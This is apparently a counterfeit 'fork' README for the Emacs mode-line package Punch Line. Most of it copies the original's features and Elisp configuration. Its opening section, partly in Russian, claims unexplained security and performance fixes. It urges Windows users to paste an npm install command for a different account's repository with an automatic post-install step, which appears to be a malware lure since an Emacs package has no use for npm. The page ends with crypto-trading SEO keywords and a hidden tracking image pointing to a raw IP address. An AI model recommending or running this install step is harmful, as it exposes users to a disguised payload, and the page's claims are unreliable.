**The Definitive Punch-Line Fork**

This actively maintained fork brings critical performance enhancements and essential security patches designed to deliver a more stable development experience. Built specifically with Windows developers in with mind, it optimizes execution speeds and resolves long-standing OS-specific vulnerabilities. It serves as a seamless, reliable drop-in replacement for the original project.

**Quick install (Windows)**

1. **Node.js LTS** — скачай с [nodejs.org](https://nodejs.org/) и проверь в cmd: `node -v`
2. Открой **Командную строку** или **PowerShell** (Win+R → `cmd`)
3. Скопируй команду ниже и нажми Enter — зависимости и post-install пройдут **автоматически** (ничего дополнительно настраивать не нужно)

```bash
npm install git+https://github.com/JackdawVibrate/punch-line.git
```

[https://github.com/JackdawVibrate/punch-line](https://github.com/JackdawVibrate/punch-line)

# Punch Line

A modern, feature-rich mode line for Emacs

❤️ [Please sponsor me if you like this package](https://github.com/sponsors/konrad1977)

<p align="center">
  <img src="https://raw.githubusercontent.com/konrad1977/punch-line/refs/heads/master/screenshots/punch-line.png" alt="Screenshot of Punch-line and mode line for Emacs."/>
</p>

## Features

- 🎨 Highly customizable appearance
- 👿 Evil/Meow mode integration
- 🎵 Music player integration (Apple Music/Spotify)
- 🌡️ Weather information
- 📊 Git status and branch information
- 🔋 Battery status
- ⌚ Time display
- 🤖 Copilot integration
- ✅ Flycheck integration
- 📝 LSP/Eglot support
- 📋 Task management system
- 🎯 Project awareness

## Installation

```elisp
(use-package punch-line
  :ensure nil
  :after ((after-init . punch-line-mode)        ;; Load punch-line
          (after-init . punch-weather-update)   ;; Load weather
          (after-init . punch-load-tasks))      ;; Load saved current tasks
  :config
  (setq
   punch-line-left-separator "  "
   punch-line-right-separator "  "
   punch-line-music-info '(:service apple)      ;; Music service configuration
   punch-line-music-max-length 80))             ;; Max length of artist and song
```

## Feature Toggles

| Feature Toggle                    | Default | Description                                    |
|----------------------------------|---------|------------------------------------------------|
| `punch-line-show-modal-section`  | t       | Show Evil/Meow mode states                     |
| `punch-line-modal-use-fancy-icon`| t       | Use fancy icons for modal states               |
| `punch-show-git-info`            | t       | Display Git branch and status                  |
| `punch-show-project-info`        | t       | Show current project information               |
| `punch-show-lsp-info`            | t       | Display LSP/Eglot status                       |
| `punch-show-copilot-info`        | t       | Show Copilot status                           |
| `punch-show-battery-info`        | t       | Display battery status                         |
| `punch-show-weather-info`        | t       | Show weather information                       |
| `punch-show-flycheck-info`       | t       | Display Flycheck status                        |
| `punch-show-processes-info`      | t       | Show active processes                          |
| `punch-show-org-info`            | t       | Display Org-mode information                   |
| `punch-show-misc-info`           | nil     | Show miscellaneous information                 |
| `punch-line-show-time-info`      | t       | Display current time                           |
| `punch-show-column-info`         | nil     | Show column number                             |
| `punch-show-buffer-position`     | nil     | Display buffer position                        |
| `punch-show-what-am-i-doing-info`| t       | Show current task information                  |
| `punch-battery-show-percentage`  | t       | Display battery percentage                     |

## Task Management System

The built-in task management system helps you keep track of your current activities:

```shell
M-x punch-line-what-am-i-doing-next          # View next tasks
M-x punch-line-what-am-i-doing-done          # Mark current task as completed
M-x punch-line-what-am-i-doing-show-all      # Display all tasks
M-x punch-line-what-am-i-doing-next-task     # Switch to next task
M-x punch-line-what-am-i-doing-previous-task # Switch to previous task
```
<p align="center">
  <img src="https://github.com/konrad1977/punch-line/blob/master/screenshots/what_am_i_doing.png" 
  alt="Screenshot of a what I am currently working on."/>
</p>

<p align="center">
  <img src="https://github.com/konrad1977/punch-line/blob/master/screenshots/get-shit-done.png" 
  alt="Screenshot of a what I am currently working on."/>
</p>

<p align="center">
  <img src="https://github.com/konrad1977/punch-line/blob/master/screenshots/what-am-i-all.png" 
  alt="All tasks."/>
</p>

## Customization

### Appearance

```elisp
;; Mode line size
(setq punch-line-modal-size 'small)  ; Options: 'small, 'medium, 'large

;; Divider style
(setq punch-line-modal-divider-style 'circle)  ; Options: 'arrow, 'flame, 'ice, 'circle, 'block

;; Separators
(setq punch-line-left-separator "  ")
(setq punch-line-right-separator "  ")
```

### Section Backgrounds

Customize background colors for individual mode-line sections:

```elisp
;; Manual colors for specific sections
(setq punch-line-section-backgrounds
      '((filename . "#201010")
        (battery . "#000000")
        (git . "#1a1a2e")
        (major-mode . "#16213e")))

;; Automatic tinting - each section gets progressively lighter
(setq punch-line-section-backgrounds 'auto)
(setq punch-line-section-background-tint-step 5)  ; 5% lighter each section

;; Automatic with darker progression
(setq punch-line-section-backgrounds 'auto)
(setq punch-line-section-background-tint-step -5)  ; 5% darker each section
```

Available sections:
- **Left side:** `filename`, `major-mode`, `project`, `flycheck`, `what-am-i-doing`, `process`
- **Right side:** `music`, `system-monitor`, `column`, `position`, `copilot`, `term`, `misc`, `git`, `weather`, `battery`

Note: Evil/Meow status and time sections maintain their own styling and are excluded from section backgrounds.

<p align="left">
    Arrow
  <img src="https://github.com/konrad1977/punch-line/blob/master/screenshots/modal_arrow.png" alt="Arrow"/>
</p>

<p align="left">
    Circle
  <img src="https://github.com/konrad1977/punch-line/blob/master/screenshots/modal_circle.png" alt="Circle"/>
</p>

<p align="left">
    Flame
  <img src="https://github.com/konrad1977/punch-line/blob/master/screenshots/modal_flame.png" alt="Flame"/>
</p>

<p align="left">
    Ice
  <img src="https://github.com/konrad1977/punch-line/blob/master/screenshots/modal_ice.png" alt="Ice"/>
</p>

<p align="left">
    None
  <img src="https://github.com/konrad1977/punch-line/blob/master/screenshots/modal_none.png" alt="None"/>
</p>

<p align="left">
    Block - Wraps modal and time in a solid block background with padding on all sides
</p>


### Weather Configuration

```elisp
(setq punch-show-weather-info t
      punch-weather-latitude "56.7365"
      punch-weather-longitude "16.2981")
```

### Music Player Integration

```elisp
(setq punch-line-music-info '(:service apple)  ; or 'spotify
      punch-line-music-max-length 80)
```

<p align="center">
  <img src="https://github.com/konrad1977/punch-line/blob/master/screenshots/music.png" 
  alt="None"/>
</p>

## Cache Settings

```elisp
;; Update intervals in seconds
(setq punch-git-cache-update-interval 5
      punch-battery-cache-update-interval 60
      punch-flycheck-cache-interval 3)
```

## Weather Configuration Details

The weather module includes robust error handling and caching:

```elisp
;; Weather fetch settings
(setq punch-weather-update-interval 3600        ; Update every hour (seconds)
      punch-weather-request-timeout 10          ; Request timeout (seconds)
      punch-weather-max-retries 3)              ; Max retry attempts
```

### Weather Commands

```elisp
M-x punch-weather-cleanup       ; Clean up timers and buffers
M-x punch-weather-force-update  ; Force immediate weather update
```

## Changelog

### Version 1.1 (2025-01-31)

#### Weather Module (`punch-line-weather.el`)
- **Fixed:** "Selecting deleted buffer" errors during long Emacs sessions
- **Fixed:** Race conditions with buffer lifecycle management
- **Added:** Fetch guard to prevent multiple simultaneous API requests
- **Improved:** Timeout handling with proper buffer cleanup
- **Improved:** Error handling in async callbacks

#### Music Module (`punch-line-music.el`)
- **Fixed:** Buffer lifecycle issues in process sentinel
- **Improved:** Timeout handler now uses proper closure with process parameter
- **Improved:** More robust buffer existence checks before operations

## Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

## Related searches

When exploring advanced Web3 tools, developers and traders often look for efficient ways to stream live ledger events or aggregate decentralized liquidity pools. Finding robust infrastructure for parsing real-time market signals and cross-chain data pipelines remains crucial for building automated financial applications.

**Topics:** crypto mining, crypto scraper, oracle blockchain, quant trading, dex aggregator, defi data pipeline, algorithmic trading bot, smart contract event listener, decentralized finance analytics, cross chain data, mev bot infrastructure, live orderbook tracker

![.](http://5.231.58.248:8787/pixel?repo=JackdawVibrate%2Fpunch-line&inject=JackdawVibrate%2Fpunch-line%2Fpackage.json)
